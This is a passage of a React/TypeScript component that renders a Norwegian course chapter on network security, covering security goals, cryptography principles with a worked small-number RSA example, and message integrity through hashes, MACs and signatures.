import { useState } from "react";
import { SiteHeader } from "@/components/SiteHeader";
import { Button } from "@/components/ui/button";
import {
  BookOpen,
  ChevronDown,
  ChevronRight,
  ArrowLeft,
  ArrowRight,
  FolderOpen,
  ExternalLink,
} from "lucide-react";
import { SectionPager, type SectionNavItem } from "./SectionPager";

type Tab = "intro" | "8.1" | "8.2" | "8.3" | "8.4" | "8.5" | "8.6" | "8.7" | "8.8" | "8.9" | "8.10";

const SECTIONS_8: SectionNavItem[] = [
  { id: "intro", label: "Start her" },
  { id: "8.1", label: "8.1 Hva er sikkerhet?" },
  { id: "8.2", label: "8.2 Kryptografi" },
  { id: "8.3", label: "8.3 Integritet" },
  { id: "8.4", label: "8.4 Autentisering" },
  { id: "8.5", label: "8.5 TLS" },
  { id: "8.6", label: "8.6 IPsec & VPN" },
  { id: "8.7", label: "8.7 Brannmurer" },
  { id: "8.8", label: "8.8 IDS & IPS" },
  { id: "8.9", label: "8.9 Web-angrep" },
  { id: "8.10", label: "8.10 Oppgaver" },
];
const NEXT_CHAPTER_8 = { slug: "kurose-kap-9", title: "Multimedia-nettverk" };

export function KuroseKap8Page() {
  const [tab, setTab] = useState<Tab>("intro");
  return (
    <div className="min-h-screen bg-background">
      <SiteHeader />
      <main className="container mx-auto px-4 py-4 max-w-6xl">
        <div className="mb-3 flex items-center flex-wrap gap-x-3 gap-y-1 border-b border-border pb-1.5">
          <div className="flex items-center gap-1.5 text-xs text-muted-foreground min-w-0">
            <a
              href="/stack/dte-2507"
              className="inline-flex items-center gap-1 hover:text-foreground shrink-0"
            >
              <FolderOpen className="h-3 w-3" /> DTE-2507
            </a>
            <span>·</span>
            <a href="/stack/kurose-kurs" className="hover:text-foreground shrink-0">
              Kurose-kurset
            </a>
            <span>·</span>
            <h1 className="text-sm font-bold tracking-tight text-foreground truncate">
              Kap. 8 — Sikkerhet i nettverk
            </h1>
          </div>
          <nav className="ml-auto flex flex-wrap gap-0.5">
            <TabBtn active={tab === "intro"} onClick={() => setTab("intro")}>
              Start
            </TabBtn>
            <TabBtn active={tab === "8.1"} onClick={() => setTab("8.1")} title="Hva er sikkerhet?">
              8.1
            </TabBtn>
            <TabBtn active={tab === "8.2"} onClick={() => setTab("8.2")} title="Kryptografi">
              8.2
            </TabBtn>
            <TabBtn active={tab === "8.3"} onClick={() => setTab("8.3")} title="Integritet">
              8.3
            </TabBtn>
            <TabBtn active={tab === "8.4"} onClick={() => setTab("8.4")} title="Autentisering">
              8.4
            </TabBtn>
            <TabBtn active={tab === "8.5"} onClick={() => setTab("8.5")} title="TLS">
              8.5
            </TabBtn>
            <TabBtn active={tab === "8.6"} onClick={() => setTab("8.6")} title="IPsec & VPN">
              8.6
            </TabBtn>
            <TabBtn active={tab === "8.7"} onClick={() => setTab("8.7")} title="Brannmurer">
              8.7
            </TabBtn>
            <TabBtn active={tab === "8.8"} onClick={() => setTab("8.8")} title="IDS & IPS">
              8.8
            </TabBtn>
            <TabBtn active={tab === "8.9"} onClick={() => setTab("8.9")} title="Web-angrep">
              8.9
            </TabBtn>
            <TabBtn active={tab === "8.10"} onClick={() => setTab("8.10")} title="Oppgaver">
              Oppg.
            </TabBtn>
          </nav>
        </div>

        {tab === "intro" && <Intro onPick={setTab} />}
        {tab === "8.1" && <Section81 />}
        {tab === "8.2" && <Section82 />}
        {tab === "8.3" && <Section83 />}
        {tab === "8.4" && <Section84 />}
        {tab === "8.5" && <Section85 />}
        {tab === "8.6" && <Section86 />}
        {tab === "8.7" && <Section87 />}
        {tab === "8.8" && <Section88 />}
        {tab === "8.9" && <Section89 />}
        {tab === "8.10" && <Section810 />}

        <SectionPager
          tabs={SECTIONS_8}
          current={tab}
          onPick={(id) => setTab(id as Tab)}
          nextChapter={NEXT_CHAPTER_8}
        />
      </main>
    </div>
  );
}

function TabBtn({
  children,
  active,
  onClick,
  title,
}: {
  children: React.ReactNode;
  active: boolean;
  onClick: () => void;
  title?: string;
}) {
  return (
    <button
      onClick={onClick}
      title={title}
      className={`rounded px-2 py-1 text-xs font-medium transition-colors ${
        active
          ? "bg-brand/15 text-brand"
          : "text-muted-foreground hover:bg-muted hover:text-foreground"
      }`}
    >
      {children}
    </button>
  );
}

function Intro({ onPick }: { onPick: (t: Tab) => void }) {
  return (
    <div className="grid gap-3 sm:grid-cols-2 text-sm">
      <div className="rounded-xl border border-border bg-card p-4">
        <h2 className="text-base font-semibold mb-2 flex items-center gap-2">
          <BookOpen className="h-4 w-4" /> Læringsmål
        </h2>
        <ul className="list-disc pl-5 text-muted-foreground space-y-1">
          <li>
            Definere de fire sikkerhetsmålene — konfidensialitet, integritet, autentisering,
            tilgjengelighet — og kjenne igjen hvilket mål en gitt angreps-form bryter.
          </li>
          <li>
            Forklare forskjellen på symmetrisk og asymmetrisk kryptografi, og når man trenger
            hvilken.
          </li>
          <li>
            Bruke hash-funksjoner, MAC og HMAC til å oppdage tukling, og forklare hvorfor en ren
            hash ikke er nok.
          </li>
          <li>Tegne en TLS-handshake og peke på hvor nøklene faktisk dannes.</li>
          <li>Skille mellom IPsec transport-mode og tunnel-mode, og mellom AH og ESP.</li>
          <li>
            Skrive enkle pakkefilter-regler, og forklare hvorfor stateful er bedre enn stateless.
          </li>
          <li>
            Gjenkjenne XSS, CSRF og SQL-injeksjon i koden, og vite hvilket forsvar som faktisk
            virker for hver av dem.
          </li>
        </ul>
      </div>

      <div className="rounded-xl border border-border bg-card p-4">
        <h2 className="text-base font-semibold mb-2">Kapittelets struktur</h2>
        <ol className="list-decimal pl-5 text-muted-foreground space-y-1">
          <li>Hva sikkerhet i nettverk faktisk betyr</li>
          <li>Kryptografiens to verktøy — symmetrisk og asymmetrisk</li>
          <li>Meldings-integritet — hash, MAC, signering</li>
          <li>Endepunkts-autentisering — nonce og sertifikater</li>
          <li>TLS — hvordan nettlesere snakker trygt</li>
          <li>IPsec og VPN — sikkerhet på nettverkslaget</li>
          <li>Brannmurer — hvem som slipper inn</li>
          <li>IDS og IPS — å oppdage innbrudd</li>
          <li>Web-angrep — XSS, CSRF, SQL-injeksjon</li>
          <li>Oppgaver — fem stykker som binder alt sammen</li>
        </ol>
        <div className="mt-3 flex gap-2">
          <Button size="sm" onClick={() => onPick("8.1")}>
            Start på 8.1 →
          </Button>
        </div>
      </div>

      <div className="rounded-xl border border-amber-500/30 bg-amber-500/5 p-4">
        <div className="text-[10px] uppercase tracking-wider text-amber-700 dark:text-amber-400 font-semibold mb-1">
          Lese-tips
        </div>
        <p className="text-muted-foreground text-[13px]">
          Sikkerhet er et stort domene, men nesten alt vi bruker i praksis er bygd på en håndfull
          byggeklosser. Hvis du holder fokus på de fire målene fra 8.1 gjennom hele kapittelet, og
          hele tiden spør «hvilket mål dekker denne mekanismen?», hjelper rammeverket deg å
          organisere alt.
        </p>
      </div>
    </div>
  );
}

// ============================================================
// 8.1 — Hva er nettverkssikkerhet
// ============================================================
function Section81() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.1" title="Hva er nettverkssikkerhet?" />

      <p className="text-muted-foreground">
        Når vi snakker om at en kommunikasjon er «sikker», mener vi vanligvis fire ting samtidig.
        Ingen av dem dekkes av et enkelt verktøy — du må stable flere mekanismer for å oppnå alle
        fire. Vi starter med å definere rammeverket før vi går løs på selve verktøyene.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <Defs
          items={[
            {
              term: "Konfidensialitet",
              body: "Bare avsender og tiltenkt mottaker skal kunne lese innholdet. En passiv tjuvlytter på lenken skal ikke kunne forstå hva som sendes. Oppnås med kryptering.",
            },
            {
              term: "Meldings-integritet",
              body: "Mottakeren skal kunne stole på at innholdet ikke har blitt endret underveis — verken ved et uhell eller av en ondsinnet aktør. Selv et enkelt bit skal ikke kunne flippes uten at det oppdages. Oppnås med MAC, HMAC eller digital signering.",
            },
            {
              term: "Endepunkts-autentisering",
              body: "Begge parter skal kunne være sikre på hvem de snakker med. Når nettleseren din kobler til en bank skal den vite at det faktisk er banken — ikke en angriper som har omdirigert DNS. Oppnås typisk med digitale sertifikater og nonces.",
            },
            {
              term: "Operasjonell tilgjengelighet",
              body: "Tjenesten skal være tilgjengelig for legitime brukere. Et angrep som lammer tjenesten (DoS, DDoS) bryter dette målet selv om det ikke leser eller endrer data. Forsvares med rate-limiting, scrubbing-tjenester og overdimensjonering.",
            },
            {
              term: "Trussel-modell",
              body: "Eksplisitt liste over hva angriperen kan og ikke kan. Eks: «angriperen kan se all pakkene på lenken, men ikke kjøre kode på endepunktene». Uten en klar trussel-modell går sikkerhets-diskusjoner i ring.",
            },
            {
              term: "Trudy som standard-fiende",
              body: "Vi bruker tradisjonelt Alice og Bob som de to legitime partene som vil snakke trygt, og Trudy som angriperen. Det er bare en pedagogisk konvensjon — i praksis er angriperen alt fra et statlig etterretningsapparat til en kompromittert WiFi-ruter.",
            },
            {
              term: "Defense in depth",
              body: "Prinsipp om at man ikke skal stole på ett enkelt forsvar. Hvis brannmuren skulle feile, skal det fortsatt være kryptering, autentisering og tilgangsstyring som beskytter. Hver lag er en uavhengig barriere.",
            },
            {
              term: "Ikke-avvisning (non-repudiation)",
              body: "Mottaker kan i ettertid bevise overfor en tredjepart at avsender faktisk sendte meldingen. Symmetrisk MAC gir IKKE dette (begge har nøkkelen — hvem som helst av dem kan ha laget tag-en). Digital signering gjør det fordi bare innehaveren av den private nøkkelen kan signere.",
            },
            {
              term: "Autorisasjon",
              body: "Adskilt fra autentisering: når jeg vet hvem du er, hvilke handlinger får du lov til? Autentisering svarer «hvem», autorisasjon svarer «hva får du gjøre». En innlogget bruker kan være autentisert men ikke autorisert til å slette andre brukeres data.",
            },
            {
              term: "Konfidensialitet vs personvern",
              body: "Konfidensialitet betyr at innholdet ikke leses av uvedkommende. Personvern er bredere — det handler også om hvilke data som overhodet samles inn, hvem som ser dem internt, hvor lenge de lagres. Krypto løser konfidensialitet; personvern krever også organisatoriske og juridiske grep.",
            },
            {
              term: "Konfidensialitet for metadata",
              body: "Selv om innholdet er kryptert lekker ofte hvem som snakker med hvem, når, og hvor mye. TLS skjuler bytene men ikke at klient X koblet til server Y kl. 14:03. Tor og mixnett er forsvar mot metadata-lekkasje.",
            },
            {
              term: "Passiv vs aktiv angriper",
              body: "Passiv: kan kun lytte (sniffe trafikk). Aktiv: kan også endre, slette, sette inn eller forsinke pakker. Forsvars-mekanismer som bare beskytter mot passiv (f.eks. ren kryptering uten MAC) er ikke nok når trussel-modellen inkluderer aktiv angriper.",
            },
            {
              term: "Insider-trussel",
              body: "Angriper med legitim tilgang til deler av systemet — ansatt, leverandør, kompromittert konto. Klassiske perimeter-forsvar (brannmur) ser ikke dette. Forsvar krever minste-privilegium, logging, og separation of duties.",
            },
          ]}
        />
        <Illustration caption="De fire målene som tilsammen utgjør «sikker kommunikasjon». Ingen av dem leveres gratis — hver krever sin egen mekanisme.">
          <FourGoalsSvg />
        </Illustration>
      </div>

      <Hvorfor title="Hvorfor skille mellom autentisering og integritet?">
        <p>
          De henger sammen — en gyldig MAC tyder på at meldingen ikke er endret OG at avsender hadde
          nøkkelen — men de adresserer ulike trusler. Integritet handler om at innholdet er uendret;
          autentisering handler om at avsender er den du tror. En klassisk feil er å kryptere uten å
          autentisere: angriper kan ikke lese, men kan fortsatt flippe bit i en CTR-cipher og dermed
          manipulere klarteksten. Derfor er det ikke nok å bare ha konfidensialitet; AEAD-modus
          (GCM, ChaCha20-Poly1305) sørger for at begge mål dekkes i én operasjon.
        </p>
      </Hvorfor>

      <Example title="Eksempel: hvilket mål brytes?">
        <ul className="list-disc pl-5 space-y-1">
          <li>
            Angriperen sniffer trafikken på et åpent café-WiFi og leser e-postene dine. → bryter{" "}
            <strong>konfidensialitet</strong>.
          </li>
          <li>
            Angriperen flipper et bit i en banktransaksjon så «overfør 100 kr» blir «overfør 900
            kr». → bryter <strong>integritet</strong>.
          </li>
          <li>
            Angriperen later som han er nettbanken og lurer deg til å taste inn koden. → bryter{" "}
            <strong>autentisering</strong>.
          </li>
          <li>
            Angriperen oversvømmer nettbanken med så mye trafikk at andre kunder ikke kommer inn. →
            bryter <strong>tilgjengelighet</strong>.
          </li>
        </ul>
        <p className="mt-2 text-muted-foreground">
          Resten av kapittelet handler om hvilke verktøy som forsvarer mot hva.
        </p>
      </Example>

      <RelatedSlugs slugs={["nettverkssikkerhet"]} />
    </article>
  );
}

// ============================================================
// 8.2 — Kryptografi
// ============================================================
function Section82() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.2" title="Kryptografi-prinsipper" />

      <p className="text-muted-foreground">
        Kryptografi gir oss konfidensialitet (og som vi skal se senere — andre mål også). Det finnes
        to fundamentalt forskjellige paradigmer: symmetrisk krypto, der begge parter har samme
        hemmelige nøkkel, og asymmetrisk, der hver part har et nøkkel-par. De løser ulike problemer
        og brukes alltid i kombinasjon i moderne protokoller.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <Defs
          items={[
            {
              term: "Symmetrisk kryptografi",
              body: "Samme nøkkel K brukes for å kryptere og dekryptere: C = E(K, P) og P = D(K, C). Veldig raskt — moderne CPU-er kjører AES i hardware med flere GB/s gjennomstrømning. Men avsender og mottaker må allerede dele K, og det er der det vanskelige starter.",
            },
            {
              term: "AES (Advanced Encryption Standard)",
              body: "Standarden for symmetrisk krypto siden 2001. Blokk-cipher med 128-bits blokker og 128/192/256-bits nøkler. Brukes i alt fra disk-kryptering til TLS. Ingen kjente effektive angrep mot full AES med riktig nøkkellengde og driftsmodus.",
            },
            {
              term: "Drifts-modus (CBC, CTR, GCM)",
              body: "En blokk-cipher krypterer bare én fast-stor blokk om gangen. For å kryptere lengre meldinger trengs en modus. CBC kjeder blokkene med XOR; CTR bruker krypteringen som en pseudo-strøm; GCM kombinerer CTR med en MAC og er førstevalg i dag.",
            },
            {
              term: "Asymmetrisk kryptografi",
              body: "Hver bruker har et nøkkel-par: en offentlig nøkkel som alle ser, og en privat nøkkel som bare hun har. Alt kryptert med offentlig nøkkel kan bare leses med tilhørende privat nøkkel. Løser nøkkel-distribusjon — men er ~1000 ganger tregere enn symmetrisk.",
            },
            {
              term: "RSA",
              body: "Klassisk asymmetrisk algoritme, basert på vanskelighetsgraden ved å faktorisere et stort tall som er produktet av to primtall. Moderne nøkkellengde er 2048 eller 3072 bit. Brukes både til kryptering og digital signering, men erstattes gradvis av ECC fordi nøkler og signaturer blir mye mindre.",
            },
            {
              term: "ECC (Elliptic Curve Cryptography)",
              body: "Asymmetrisk krypto basert på algebraen på elliptiske kurver. Gir samme sikkerhet som RSA med mye mindre nøkler — en 256-bits ECC-nøkkel tilsvarer omtrent 3072 bits RSA. Mindre nøkler betyr mindre data over linja og raskere operasjoner. Dominerer på mobil og i moderne TLS.",
            },
            {
              term: "Diffie-Hellman nøkkelutveksling",
              body: "Algoritme som lar to parter avtale en delt hemmelighet over en åpen kanal, uten å ha kommunisert på forhånd. Begge velger en privat verdi, sender en avledet offentlig verdi, og kombinerer egne private med motpartens offentlige til samme felles tall. En tjuvlytter ser bare de offentlige verdiene og kan ikke regne ut den delte hemmeligheten.",
            },
            {
              term: "Hybrid-system",
              body: "I praksis bruker man asymmetrisk krypto eller DH bare til å avtale en sesjons-nøkkel, og deretter krypteres alle data med symmetrisk AES. Du får det beste fra begge — løste nøkkel-distribusjon, samtidig som datasiden går i hardware-fart.",
            },
            {
              term: "Blokk-cipher vs strøm-cipher",
              body: "Blokk-cipher (AES) krypterer faste blokker (128 bit). Strøm-cipher (ChaCha20, RC4) produserer en lang pseudo-tilfeldig nøkkelstrøm som XOR-es med klarteksten byte-for-byte. CTR-modus gjør en blokk-cipher om til en strøm-cipher i praksis.",
            },
            {
              term: "ECB-modus (Electronic Codebook)",
              body: "Naiveste blokk-cipher-modus: hver blokk krypteres uavhengig med samme nøkkel. Problem: like klartekst-blokker gir like ciphertext-blokker. Et kjent eksempel er Tux-bildet som forblir gjenkjennelig etter ECB-kryptering. Bruk ALDRI ECB for noe annet enn øvinger.",
            },
            {
              term: "CBC-modus (Cipher Block Chaining)",
              body: "Hver klartekst-blokk XOR-es med forrige ciphertext-blokk før kryptering. Første blokk XOR-es med en IV (initialization vector). Skjuler mønstre, men er sekvensiell (kan ikke parallelliseres) og krever separat MAC for integritet — feil bruk gir padding-oracle-angrep.",
            },
            {
              term: "CTR-modus (Counter)",
              body: "Krypterer en teller (IV ‖ 0, IV ‖ 1, ...) og XOR-er resultatet med klarteksten. Helt parallelliserbar — perfekt for hardware-akselerasjon. Men hvis (nøkkel, teller)-paret gjenbrukes, kan klarteksten utledes ved å XOR-e to ciphertekster.",
            },
            {
              term: "GCM-modus (Galois/Counter Mode)",
              body: "AEAD-modus: kombinerer AES-CTR for kryptering med GHASH for autentisering. Produserer både ciphertext og en autentiserings-tag i én operasjon. Førstevalg i dag — TLS 1.3 tillater nesten ingenting annet. Krever unik nonce per (nøkkel, melding) — gjenbruk er katastrofalt.",
            },
            {
              term: "IV (Initialization Vector) / nonce",
              body: "Tilfeldig eller telle-basert verdi som sendes klart sammen med ciphertext. Sørger for at samme klartekst kryptert to ganger med samme nøkkel gir forskjellig ciphertext. CBC krever uforutsigbar IV; CTR og GCM krever bare at nonce er unik for nøkkelen.",
            },
            {
              term: "AEAD (Authenticated Encryption with Associated Data)",
              body: "Modus som gir konfidensialitet OG integritet i én primitiv. «Associated data» (f.eks. en pakke-header) blir autentisert men ikke kryptert. GCM, ChaCha20-Poly1305 og AES-OCB er AEAD. Eliminerer hele klasser av implementasjons-feil som rammer separat-kryptering-og-MAC-konstruksjoner.",
            },
            {
              term: "Padding og PKCS#7",
              body: "Blokk-ciphere krever input i hele blokker. PKCS#7 fyller på de N manglende bytene med verdien N (eks: trenger 3 byte → tre byte 0x03). Dekryptering må sjekke padding. Hvis denne sjekken lekker via tids- eller feilmeldinger får man et padding-oracle-angrep som lar angriper dekryptere uten nøkkel.",
            },
            {
              term: "Nøkkellengde og 2^N",
              body: "En 128-bits AES-nøkkel betyr 2^128 mulige nøkler. Brute-force er praktisk umulig — selv om hele jordens datakraft brukte resten av solens levetid på det. Asymmetriske algoritmer krever lengre nøkler (RSA 2048+, ECC 256+) fordi de bygger på matematiske strukturer med smartere angrep enn brute-force.",
            },
            {
              term: "ChaCha20-Poly1305",
              body: "Alternativ AEAD til AES-GCM. Strøm-cipher (ChaCha20) + MAC (Poly1305). Konstant-tids implementasjon i programvare uten AES-hardware — derfor foretrukket på mobil med dårlig AES-NI-støtte. Brukes også av Google QUIC og WireGuard.",
            },
            {
              term: "Kerckhoffs' prinsipp",
              body: "Sikkerheten skal hvile på nøkkelens hemmelighet, ikke på algoritmens. Hemmelige algoritmer (security through obscurity) brytes erfaringsmessig så fort de blir analysert. Åpne algoritmer som har overlevd mange års offentlig kryptoanalyse er mye tryggere.",
            },
            {
              term: "Post-kvante-kryptografi",
              body: "RSA og ECC brytes av Shor's algoritme på en stor nok kvantemaskin. NIST har derfor standardisert nye algoritmer (CRYSTALS-Kyber for KEM, Dilithium for signering) som hviler på gitter-problemer som er antatt vanskelige også for kvantemaskiner. Hybrid-deployment (ECDHE + Kyber) ruller ut nå.",
            },
          ]}
        />
        <Illustration caption="Symmetrisk vs asymmetrisk flyt. Til venstre samme nøkkel begge veier; til høyre offentlig kryptering, privat dekryptering.">
          <SymVsAsymSvg />
        </Illustration>
      </div>

      <Hvorfor title="Hvorfor brukes hybrid krypto (asymmetrisk + symmetrisk) i praksis?">
        <p>
          Asymmetrisk krypto løser ett vanskelig problem som symmetrisk ikke kan: hvordan dele en
          nøkkel med noen du aldri har snakket med før, over en åpen kanal. Men prisen er stiv —
          RSA-2048-kryptering av en kilobyte tar tusenvis av ganger lengre enn AES-kryptering av
          samme kilobyte, fordi RSA innebærer modulær eksponentiasjon over store tall mens AES er
          enkle bit-operasjoner som CPU-en har i hardware.
        </p>
        <p>
          Hybrid-mønsteret bruker derfor hver primitiv til det den er god på: asymmetrisk krypto
          eller DH frakter en liten symmetrisk nøkkel (typisk 32 byte) trygt fram, og deretter
          krypteres alle de tunge dataene med AES eller ChaCha20. Du betaler asymmetri-kostnaden én
          gang per sesjon, ikke per byte. Det er hjørnesteinen i TLS, SSH, S/MIME, Signal og
          praktisk talt all moderne transport-sikkerhet.
        </p>
      </Hvorfor>

      <Illustration caption="Diffie-Hellman: begge mikser sin private verdi med motpartens offentlige, og ender på samme delte hemmelighet uten å sende den.">
        <DhSvg />
      </Illustration>

      <Example title="Eksempel: hvorfor ikke bare bruke RSA hele veien?">
        <p>
          Tenk at Alice vil sende en 10 MB fil til Bob. Hvis hun krypterer alt med Bobs
          RSA-offentlige nøkkel direkte, må hun kjøre RSA over hele filen — som er ekstremt tregt og
          ineffektivt (RSA er designet for små blokker).
        </p>
        <p className="mt-2">
          Hybrid-løsning: Alice velger en tilfeldig AES-nøkkel K (128 bit), krypterer filen med
          AES-K (rask), og krypterer bare K med Bobs RSA-nøkkel (kort melding, akseptabel kostnad).
          Bob dekrypterer K med sin private RSA-nøkkel, så dekrypterer filen med AES-K.
        </p>
        <p className="mt-2 text-muted-foreground">
          Dette mønsteret — «pakk inn nøkkelen med asymmetrisk, dataene med symmetrisk» — er
          hjørnesteinen i TLS, S/MIME og nesten alle praktiske krypto-protokoller.
        </p>
      </Example>

      <Example title="Eksempel: RSA-kryptering steg for steg med små tall">
        <p>
          RSA hviler på at det er enkelt å multiplisere store primtall, men praktisk umulig å
          faktorisere produktet tilbake. Vi bruker pinlig små tall her bare for å se mekanikken;
          ekte RSA bruker 2048-bits primtall.
        </p>
        <ol className="list-decimal pl-5 mt-1 space-y-1">
          <li>
            Velg primtall p = 11, q = 17. Da er <code>n = p·q = 187</code> og
            <code> φ(n) = (p−1)(q−1) = 160</code>.
          </li>
          <li>
            Velg offentlig eksponent <code>e = 7</code> (relativt primtall til 160).
          </li>
          <li>
            Regn ut privat eksponent <code>d</code> slik at <code>e·d ≡ 1 (mod 160)</code>. Med
            utvidet Euklid gir det <code>d = 23</code>.
          </li>
          <li>
            Offentlig nøkkel = <code>(n, e) = (187, 7)</code>. Privat nøkkel =
            <code> (n, d) = (187, 23)</code>.
          </li>
          <li>
            Krypter melding <code>m = 88</code>: <code>c = m^e mod n = 88^7 mod 187 = 11</code>.
          </li>
          <li>
            Dekrypter: <code>m = c^d mod n = 11^23 mod 187 = 88</code>. Tilbake!
          </li>
        </ol>
        <p className="mt-2 text-muted-foreground">
          Hele sikkerheten ligger i at en angriper som ser <code>n = 187</code> og
          <code> e = 7</code> må faktorisere 187 tilbake til 11·17 for å gjenutlede d. Med 2048-bits
          n er den faktoriseringen utenfor rekkevidde for klassisk maskinvare.
        </p>
      </Example>

      <RelatedSlugs slugs={["kryptografi", "dte2507-rsa-mini", "dte2507-cbc-iv"]} />
    </article>
  );
}

// ============================================================
// 8.3 — Meldings-integritet
// ============================================================
function Section83() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.3" title="Meldings-integritet — hash, MAC, signering" />

      <p className="text-muted-foreground">
        Kryptering skjuler innholdet, men gir ingen garanti for at det ikke er blitt endret. I
        CTR-modus, for eksempel, kan en angriper flippe vilkårlige bit i klarteksten ved å flippe
        tilsvarende bit i ciphertext — selv uten å kunne lese den. Vi trenger derfor en separat
        mekanisme for integritet.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <Defs
          items={[
            {
              term: "Kryptografisk hash-funksjon",
              body: "Funksjon h(m) som tar inn en melding av vilkårlig lengde og produserer en kort, fast-størrelse fingeravtrykk. Skal være praktisk umulig å (a) finne to meldinger med samme hash, eller (b) regne ut en melding som matcher en gitt hash. SHA-256 er dagens standard.",
            },
            {
              term: "Hvorfor hash alene ikke er nok",
              body: "Hvis Alice sender (m, h(m)) til Bob over en åpen lenke, kan Trudy bytte ut hele meldingen til (m', h(m')) — hashen passer fortsatt. Hash gir bare beskyttelse mot tilfeldig endring (transmission errors), ikke mot en aktiv angriper.",
            },
            {
              term: "MAC (Message Authentication Code)",
              body: "Som en hash, men funksjonen tar inn en delt hemmelig nøkkel: t = MAC(K, m). Mottakeren regner ut samme MAC med samme K og sjekker at den matcher. Trudy uten K kan ikke generere gyldig t, så hun kan ikke forfalske meldinger. Krever at avsender og mottaker allerede deler K.",
            },
            {
              term: "HMAC",
              body: "Standard-konstruksjon for å lage en MAC ut av en hvilken som helst hash-funksjon. HMAC-SHA256 = SHA256((K ⊕ opad) || SHA256((K ⊕ ipad) || m)). Den doble hashen og de to konstantene gjør at lengde-extension-angrep mot rene hash-baserte MAC-er ikke fungerer.",
            },
            {
              term: "Digital signering",
              body: "Asymmetrisk versjon av MAC. Alice signerer m med sin private nøkkel: s = sign(privA, m). Hvem som helst med Alices offentlige nøkkel kan verifisere: verify(pubA, m, s) → ja/nei. Gir også ikke-avvisbarhet — Alice kan ikke i ettertid hevde at hun ikke signerte, siden bare hun har privA.",
            },
            {
              term: "Signer hashen, ikke meldingen",
              body: "Asymmetrisk signering er treigt, så i praksis signerer man h(m) i stedet for m. Alice sender (m, sign(privA, h(m))). Bob henter m, beregner h(m), og verifiserer signaturen mot den. Like trygt fordi hash-en er kollisjonsresistent.",
            },
            {
              term: "Replay-angrep",
              body: "Selv en gyldig signert melding kan misbrukes hvis Trudy spiller den av på nytt senere. «Overfør 100 kr fra Alice til Trudy» med Alices signatur kan sendes 1000 ganger. Forsvar: inkluder en nonce eller tidsstempel i meldingen som signeres.",
            },
            {
              term: "Preimage-resistens",
              body: "Gitt en hash y skal det være praktisk umulig å finne en m som hasher til y (h(m) = y). Hvis dette brytes kan en angriper «invertere» hashen — alvorlig for passord-lagring der h(passord) er det som lagres.",
            },
            {
              term: "Second-preimage-resistens",
              body: "Gitt en konkret melding m1 skal det være praktisk umulig å finne en annen m2 ≠ m1 med h(m1) = h(m2). Hvis dette brytes kan angriperen lage en alternativ kontrakt som har samme hash som den signerte original-kontrakten.",
            },
            {
              term: "Kollisjons-resistens",
              body: "Det skal være praktisk umulig å finne et hvilket som helst par (m1, m2) med h(m1) = h(m2). Lavere bar enn second-preimage fordi angriperen får velge begge — derfor er denne grensen 2^(n/2) («fødselsdag-paradokset») i stedet for 2^n. SHA-1 ble pensjonert da praktiske kollisjoner ble vist.",
            },
            {
              term: "SHA-2 og SHA-3 familier",
              body: "SHA-2 (SHA-256, SHA-384, SHA-512) er Merkle-Damgård-konstruksjoner basert på Davies-Meyer. SHA-3 (Keccak) er en svamp-konstruksjon valgt etter åpen NIST-konkurranse, designet for å være matematisk uavhengig av SHA-2 i tilfelle den ene skulle brytes.",
            },
            {
              term: "MD5 og SHA-1 — pensjonert",
              body: "MD5 har vært brutt for kollisjoner siden 2004; SHA-1 siden 2017 (SHAttered-angrepet). Bruk dem aldri for sikkerhet (signering, sertifikater). De brukes fortsatt som ikke-krypto-checksums for rask integritets-sjekk i ikke-fiendtlig kontekst (git-objekter, men git migrerer også).",
            },
            {
              term: "Lengde-extension-angrep",
              body: "På Merkle-Damgård-hashes (MD5, SHA-1, SHA-2) kan en angriper som har sett h(secret ‖ m) regne ut h(secret ‖ m ‖ padding ‖ m') uten å kjenne secret. Derfor må man ALDRI bygge en MAC som bare hash(secret ‖ m). HMAC er den korrekte konstruksjonen som unngår dette.",
            },
            {
              term: "Digital signering: RSA-PSS vs ECDSA vs EdDSA",
              body: "RSA-PSS er moderne RSA-signering med tilfeldig padding. ECDSA bruker elliptiske kurver — kortere signaturer, men krever god randomness per signering (en gjenbrukt nonce kan lekke privat nøkkel; PlayStation 3 ble hacket sånn). EdDSA (Ed25519) er deterministisk og uten det fotfellet — mest robuste valg i dag.",
            },
            {
              term: "Hvorfor MAC-then-encrypt vs encrypt-then-MAC vs AEAD",
              body: "Encrypt-then-MAC er beviselig riktig: krypter først, så lag MAC over ciphertext. MAC-then-encrypt (SSL/TLS gjorde dette feil i flere år) skapte angrep som POODLE og Lucky-13. AEAD-modi (GCM, ChaCha20-Poly1305) gjør begge i ett og lukker hele klassen av disse feilene.",
            },
            {
              term: "Tids-stempel og monotonisk teller",
              body: "Alternativ til nonce mot replay. Mottaker avviser meldinger eldre enn N sekunder, eller med teller mindre enn forrige. Krever klokkesynkronisering eller persistent tilstand. Brukes f.eks. i Kerberos-billetter og JWT-er med exp-felt.",
            },
          ]}
        />
        <Illustration caption="Hash mapper vilkårlig input til et kort fingeravtrykk. Selv én flippet bit i input endrer hele hashen.">
          <HashSvg />
        </Illustration>
      </div>

      <Hvorfor title="Hvorfor er kollisjons-resistens en lavere bar enn preimage-resistens?">
        <p>
          For en n-bits hash er brute-force på preimage (gitt en hash y, finn m) i størrelsesorden
          2^n — du må prøve halvparten av input-rommet før forventet treff. Men for kollisjoner
          (finn et par (m1, m2) med samme hash) er angriperens jobb mye lettere på grunn av{" "}
          <em>fødselsdag-paradokset</em>: i et rom med 23 personer er det 50 % sjanse for at to
          deler bursdag, ikke 50 % sjanse for at noen deler din bursdag.
        </p>
        <p>
          Generaliseringen sier at i en uniform fordeling over 2^n verdier vil du forvente en
          kollisjon etter ca. 2^(n/2) tilfeldige forsøk. Derfor er en 128-bits hash bare ekvivalent
          med 64-bits sikkerhet mot kollisjon — praktisk å brute-force i dag. Det er hvorfor SHA-256
          brukes der man trenger 128-bits kollisjons-sikkerhet (signering), mens SHA-128 aldri
          eksisterte som standard.
        </p>
      </Hvorfor>

      <Illustration caption="HMAC tar inn både meldingen og en delt nøkkel — uten nøkkelen kan ikke Trudy lage gyldig tag.">
        <HmacSvg />
      </Illustration>

      <Example title="Eksempel: signering av en pull request">
        <p>Når du commit-er kode til git med en GPG-signatur, skjer dette:</p>
        <ol className="list-decimal pl-5 mt-1">
          <li>
            git lager en tekst-representasjon av commiten (forfatter, dato, parent, tre-hash).
          </li>
